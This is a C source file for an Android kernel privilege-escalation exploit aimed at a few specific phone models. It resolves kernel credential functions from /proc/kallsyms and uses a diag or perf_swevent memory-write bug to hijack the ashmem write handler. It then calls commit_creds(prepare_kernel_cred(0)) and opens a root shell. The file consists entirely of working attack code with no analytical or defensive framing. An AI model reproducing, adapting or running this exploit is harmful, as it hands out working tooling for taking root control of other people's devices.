#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "perf_swevent.h"
#include "libdiagexploit/diag.h"

typedef struct _supported_device {
  const char *device;
  const char *build_id;
  unsigned long int ashmem_write_address;
} supported_device;

static supported_device supported_devices[] = {
  { "F-11D",            "V24R40A"   ,         0xc08ff1f4 },
  { "URBANO PROGRESSO", "010.0.3000",         0xc091b9cc },
  { "SCL21",            "IMM76D.SCL21KDALJD", 0xc0b6a684 },
  { "ISW13F",           "V69R51I",            0xc092e484 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static unsigned long int
get_ashmem_write_address(void)
{
  int i;
  char device[PROP_VALUE_MAX];
  char build_id[PROP_VALUE_MAX];

  __system_property_get("ro.product.model", device);
  __system_property_get("ro.build.display.id", build_id);

  for (i = 0; i < n_supported_devices; i++) {
    if (!strcmp(device, supported_devices[i].device) &&
        !strcmp(build_id, supported_devices[i].build_id)) {
      return supported_devices[i].ashmem_write_address;
    }
  }

  printf("%s (%s) is not supported.\n", device, build_id);

  return 0;
}

static void *
get_symbol_address(const char *symbol_name)
{
  FILE *fp;
  char function[BUFSIZ];
  char symbol;
  void *address;
  int ret;

  fp = fopen("/proc/kallsyms", "r");
  if (!fp) {
    printf("Failed to open /proc/kallsyms due to %s.", strerror(errno));
    return 0;
  }

  while((ret = fscanf(fp, "%p %c %s", &address, &symbol, function)) != EOF) {
    if (!strcmp(function, symbol_name)) {
      fclose(fp);
      return address;
    }
  }
  fclose(fp);

  return NULL;
}

struct cred;
struct task_struct;
struct cred *(*prepare_kernel_cred)(struct task_struct *);
int (*commit_creds)(struct cred *);

void
obtain_root_privilege(void)
{
  commit_creds(prepare_kernel_cred(0));
}

static bool
run_obtain_root_privilege(void)
{
  int fd;

  fd = open("/dev/ashmem", O_WRONLY);
  write(fd, " ", 1);
  close(fd);

  return true;
}

static bool
attempt_perf_swevent_exploit(unsigned long int address)
{
  int number_of_children;

  number_of_children = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
  if (number_of_children == 0) {
    while (true) {
      sleep(1);
    }
  }

  run_obtain_root_privilege();

  perf_swevent_reap_child_process(number_of_children);

  return true;
}

static bool
attempt_diag_exploit(unsigned long int address)
{
  struct diag_values injection_data;

  injection_data.address = address;
  injection_data.value = (uint16_t)&obtain_root_privilege;

  if (!diag_inject(&injection_data, 1)) {
    return false;
  }

  run_obtain_root_privilege();

  injection_data.value = 3;
  return diag_inject(&injection_data, 1);
}

int
main(int argc, char **argv)
{
  unsigned long int address;
  int fd;
  bool success;

  prepare_kernel_cred = get_symbol_address("prepare_kernel_cred");
  commit_creds = get_symbol_address("commit_creds");

  address = get_ashmem_write_address();
  if (!address) {
    exit(EXIT_FAILURE);
  }

  success = attempt_diag_exploit(address);
  if (!success) {
    success = attempt_perf_swevent_exploit(address);
  }

  if (getuid() != 0) {
    printf("Failed to obtain root privilege.\n");
    exit(EXIT_FAILURE);
  }

  system("/system/bin/sh");

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
